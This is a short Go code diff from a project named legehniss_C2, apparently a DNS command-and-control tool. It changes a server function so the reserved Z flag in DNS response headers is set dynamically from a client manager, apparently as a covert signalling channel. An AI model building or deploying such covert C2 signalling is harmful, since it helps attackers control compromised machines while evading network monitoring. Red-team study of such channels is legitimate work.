@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"github.com/faanross/legehniss_C2/internal/client"
 	"github.com/faanross/legehniss_C2/internal/config"
 	"github.com/faanross/legehniss_C2/internal/dnsparser"
 	"github.com/faanross/legehniss_C2/internal/visualizer"
@@ -323,8 +324,13 @@ func (w *worker) buildAndSendResponse(parsedRequest *dnsparser.ParsedPacket, cli
 
 // setServerZValue manually sets the Z flag value in a packed DNS response
 func setServerZValue(packedMsg []byte) error {
-	// Z value to set (will be dynamic later, for now just a local var)
-	zValue := uint8(3) // Example value, change as needed
+	zValue := uint8(0) // Z-value of 0 is baseline ("do nothing")
+
+	updateZ, newZ := client.ZManager.CheckAndReset() // Call function to see if flag is set, and new value
+
+	if updateZ {
+		zValue = newZ // if flag is true update to proposed Z-value, else ignore
+	}
 
 	// The DNS header is 12 bytes long
 	if len(packedMsg) < 12 {
